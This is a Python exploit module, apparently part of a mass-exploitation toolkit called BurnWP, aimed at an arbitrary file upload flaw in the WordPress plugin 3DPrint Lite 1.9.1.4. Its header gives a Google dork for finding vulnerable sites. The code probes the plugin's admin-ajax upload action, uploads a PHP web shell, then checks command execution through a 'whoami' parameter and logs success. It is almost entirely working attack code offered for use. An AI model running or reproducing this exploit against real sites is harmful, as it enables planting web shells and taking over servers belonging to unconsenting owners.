
# Exploit Title: Wordpress Plugin 3DPrint Lite 1.9.1.4 - Arbitrary File Upload
# Google Dork: inurl:/wp-content/plugins/3dprint-lite/
# Date: 22/09/2021
# Exploit Author: spacehen
# Vendor Homepage: https://wordpress.org/plugins/3dprint-lite/
# Version: <= 1.9.1.4
# Tested on: Ubuntu 20.04.1

from pathlib import Path
import importlib

NO_USED = None
X_HELPER = importlib.import_module('Core.Core_Helper')
FUNC_SAVE = importlib.import_module('main')



class Exploit_P3Dlite:
	def __init__(self, Target, Proxies=NO_USED, Sess=NO_USED, WPNonce=NO_USED, UserAgent=NO_USED):
		self.SET_Timeout = 30 if Proxies else 10
		self.Target = Target 
		self.Proxies = Proxies
		self.Sess = Sess
		self.WPNonce = WPNonce
		self.ROOT_X = Path(__file__).resolve().parents[1]
		self.Config_AU = UserAgent
	
	def P3D_Check(self):
		Ajax_Check = X_HELPER.Threaded_GET(
											self.Target, 
											'wp-admin/admin-ajax.php?action=p3dlite_handle_upload', 
											self.SET_Timeout, 
											self.Config_AU, 
											NO_USED, 
											NO_USED,
											NO_USED,
											'req_get',
											self.Proxies,
											NO_USED)
		RES_VULN = Ajax_Check.run()
		REZ_Checked = [RES_VULN[i] for i in RES_VULN][0]
		if 'jsonrpc' in REZ_Checked['resp'].text:
			return True
		
		return False

	def Exploiter(self):
		try:
			Inj_P3Dlite = X_HELPER.Threaded_POST(
													CFG_DOMAIN=self.Target, 
													CFG_VULN='wp-admin/admin-ajax.php?action=p3dlite_handle_upload', 
													CFG_TIMEOUT=self.SET_Timeout, 
													CFG_USERAGENT=self.Config_AU, 
													CFG_DATA=NO_USED,   

													CFG_FILE_UPLOAD={'file': f'{self.ROOT_X}/Files_BurnWP/error_log.php'},  
													CFG_RAW_BODY=NO_USED,
													CFG_DELAY_ATTACK=NO_USED,
													CFG_MODE="multipart",
													SET_REDIRECT=NO_USED,
													CFG_Proxies=self.Proxies,
													Mem_Sess=NO_USED)
			POST_P3Dlite = Inj_P3Dlite.run()
			REZ_INJED = [POST_P3Dlite[i] for i in POST_P3Dlite][0]
			if REZ_INJED['resp']:
				if 'error_log.php' in str(REZ_INJED['resp'].text):
					RZ_SHXLL = X_HELPER.Func_ValidShell(self.Timeout, self.Proxies, f'{self.Target}/wp-content/uploads/p3d/error_log.php?whoami=@1337')
					if RZ_SHXLL:
						X_HELPER.Printed_Value.Log_Success(self.Target, '[PLUGIN] P3Dlite_File_Upload | Weclome SHELL')
					else:
						X_HELPER.Printed_Value.Log_Fail(REZ_INJED['domain'], f"[PLUGIN] P3Dlite_File_Upload | SHELL Failed") 

				else:
					X_HELPER.Printed_Value.Log_Fail(REZ_INJED['domain'], f"[PLUGIN] P3Dlite_File_Upload | Failed")
			else:

				X_HELPER.Printed_Value.Log_Fail(self.Target, f"[PLUGIN] P3Dlite_File_Upload | Failed")
		except:pass 
			#X_HELPER.Printed_Value.Log_Error('Error Exploiter P3Dlite', f"{er}") 	 	




def Plugin_BurnWP(Target, Proxies, Sess, WPNonce, UserAgent, PLUGIN_CONTROL_SYSTEM, FOUND_CMS):
	try:

		if PLUGIN_CONTROL_SYSTEM['C_WordPress'] and FOUND_CMS == 'WORDPRESS': #IF BOTH ARE TRUE NOT TRUE EXIT
			EX_TASK = Exploit_P3Dlite(Target, Proxies, Sess, WPNonce, UserAgent)
			EX_TASK.Exploiter()

		return
	except:pass 